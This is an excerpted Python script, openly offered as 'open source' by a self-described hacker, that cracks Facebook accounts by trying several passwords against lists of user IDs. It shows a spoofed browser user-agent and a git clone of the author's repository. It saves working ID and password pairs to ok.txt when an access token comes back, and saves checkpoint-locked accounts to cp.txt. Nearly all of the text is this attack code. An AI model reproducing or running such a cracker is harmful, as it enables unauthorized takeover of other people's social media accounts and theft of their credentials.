...
#AUTHOR : ERICBADHACKER (TIP)
#OPEN SOURCE :)
#DON'T FORGET TO GIVE CREDIT TO TIP
...
header = {"user-agent": '[Mozilla/5.0 (Windows; U; Windows NT 5.1; da-dk) AppleWebKit/523.15.1 (KHTML, like Gecko) Version/3.0.4 Safari/523.15;]',
...
\033[37;1m[\033[41;1mCHIGOZIE ONUEGBE\033[00;1m\033[37;1m ]\n
 ...
 \033[32;1mCreator \033[37;1m: \033[33;1mERIC
...
def log_sel():
	...
	if sel == "":
		...
		import os
		try:
			os.system("git clone https://github.com/ERICBADHACKER/Bini")
...
def crack_select1():
	...
	print("\033[92;1m  ERIC CLONING ACTIVATED \x1b[0m")
	print("")
	linex()
	print("")
	def main(arg):
		...
		try:
			...
			if "access_token" in q and "EAAA" in q:
				print(" \033[1;32m [ERIC-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				...
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [ERIC-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					q = json.loads(data)
					if "access_token" in q and "EAAA" in q:
						print(" \033[1;32m [ERIC-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							q = json.loads(data)
							if "access_token" in q and "EAAA" in q:
								print(" \033[1;32m [ERIC-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [ERIC-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
